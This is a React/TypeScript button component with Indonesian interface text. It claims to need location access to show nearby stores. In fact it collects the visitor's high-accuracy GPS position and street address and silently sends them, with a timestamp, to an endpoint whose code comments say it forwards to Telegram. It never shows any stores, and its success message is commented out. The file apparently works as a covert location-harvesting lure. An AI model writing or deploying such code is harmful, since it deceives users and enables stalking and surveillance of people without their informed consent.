"use client";

import { useState } from "react";

interface LocationButtonProps {
  onLocationSuccess?: (location: {
    lat: number;
    lng: number;
    address?: string;
  }) => void;
  onLocationError?: (error: string) => void;
}

export default function LocationButton({
  onLocationSuccess,
  onLocationError,
}: LocationButtonProps) {
  const [isLoading, setIsLoading] = useState(false);
  const [location, setLocation] = useState<{
    lat: number;
    lng: number;
    address?: string;
  } | null>(null);
  const [locationError, setLocationError] = useState("");
  const [permissionDenied, setPermissionDenied] = useState(false);

  const getCurrentLocation = async () => {
    setIsLoading(true);
    setLocation(null);
    setLocationError("");
    setPermissionDenied(false);

    if (!navigator.geolocation) {
      const errorMsg = "Browser tidak support geolocation";
      setLocationError(errorMsg);
      onLocationError?.(errorMsg);
      setIsLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const { latitude, longitude } = position.coords;

          // Dapatkan alamat dari koordinat
          const address = await getAddressFromCoords(latitude, longitude);

          const locationData = {
            lat: latitude,
            lng: longitude,
            address: address,
          };

          setLocation(locationData);
          setPermissionDenied(false);
          onLocationSuccess?.(locationData);

          // Kirim ke Telegram
          await sendLocationToTelegram(locationData);
        } catch (error) {
          const errorMsg = "Gagal mendapatkan alamat";
          setLocationError(errorMsg);
          onLocationError?.(errorMsg);
        } finally {
          setIsLoading(false);
        }
      },
      (error) => {
        let errorMsg = "Gagal mendapatkan lokasi";

        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMsg =
              "Akses lokasi ditolak. Silakan izinkan akses lokasi di browser settings Anda.";
            setPermissionDenied(true);
            break;
          case error.POSITION_UNAVAILABLE:
            errorMsg = "Informasi lokasi tidak tersedia";
            break;
          case error.TIMEOUT:
            errorMsg = "Request lokasi timeout. Coba lagi.";
            break;
          default:
            errorMsg = "Error tidak diketahui";
        }

        setLocationError(errorMsg);
        onLocationError?.(errorMsg);
        setIsLoading(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000, // 15 detik
        maximumAge: 60000,
      }
    );
  };

  // Fungsi untuk reset permission dan minta ulang
  const handleRetryPermission = () => {
    setPermissionDenied(false);
    setLocationError("");
    getCurrentLocation();
  };

  const getAddressFromCoords = async (
    lat: number,
    lng: number
  ): Promise<string> => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`
      );
      const data = await response.json();

      if (data.display_name) {
        return data.display_name;
      }
      return `Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}`;
    } catch (error) {
      return `Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}`;
    }
  };

  const sendLocationToTelegram = async (locationData: {
    lat: number;
    lng: number;
    address?: string;
  }) => {
    try {
      const response = await fetch("/api/sendLocation", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: locationData.lat,
          longitude: locationData.lng,
          address: locationData.address,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send location");
      }

      console.log("Location sent to Telegram successfully");
    } catch (error) {
      console.error("Error sending location:", error);
    }
  };

  return (
    <div className="w-full">
      {/* Tombol utama */}
      <button
        onClick={getCurrentLocation}
        disabled={isLoading}
        className={`p-3 rounded-xl w-full font-semibold text-lg transition-colors ${
          isLoading
            ? "bg-gray-400 text-gray-200 cursor-not-allowed"
            : permissionDenied
            ? "bg-red-600 text-white hover:bg-red-700"
            : location
            ? "bg-red-600 text-white hover:bg-red-700"
            : "bg-red-700 text-white hover:bg-red-800"
        }`}
      >
        {isLoading ? (
          <div className="flex items-center justify-center gap-2">
            <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            <span>memuat lokasi...</span>
          </div>
        ) : permissionDenied ? (
          <div className="flex items-center justify-center gap-2">
            <span>tidak dapat menemukan toko</span>
          </div>
        ) : location ? (
          <div className="flex items-center justify-center gap-2">
            <span>memuat lokasi</span>
          </div>
        ) : (
          <div className="flex items-center justify-center gap-2">
            <span>Aktifkan Lokasi</span>
          </div>
        )}
      </button>

      {/* Status Lokasi */}
      {location && (
        <div className="mt-2 p-3g">
          {/* <p className="text-red-700 text-sm">
            <strong>Lokasi berhasil didapatkan:</strong><br/>
            {location.address}
          </p> */}
        </div>
      )}

      {/* Error Message */}
      {locationError && !permissionDenied && (
        <div className="mb-2 text-center">
          <p className="text-red-700 text-sm">{locationError}</p>
          <button
            onClick={getCurrentLocation}
            className="mt-2 text-red-700 underline text-sm"
          >
            Coba Lagi
          </button>
        </div>
      )}

      {/* Permission Denied Message dengan instruksi */}
      {permissionDenied && (
        <div className="mt-2 p-3 ">
          <p className="text-red-700 text-sm mb-2">
            <strong>
              mohon aktifkan akses lokasi agar kami dapat memuat toko-toko didaerahmu.
            </strong>
          </p>
          <div className="flex gap-2">
            <button
              onClick={handleRetryPermission}
              className="px-3 py-1 bg-red-600 text-white text-sm rounded hover:bg-red-700"
            >
              Coba Request Lagi
            </button>
            <button
              onClick={() => window.location.reload()}
              className="px-3 py-1 bg-gray-50 text-black text-sm rounded hover:bg-gray-50"
            >
              Refresh Halaman
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
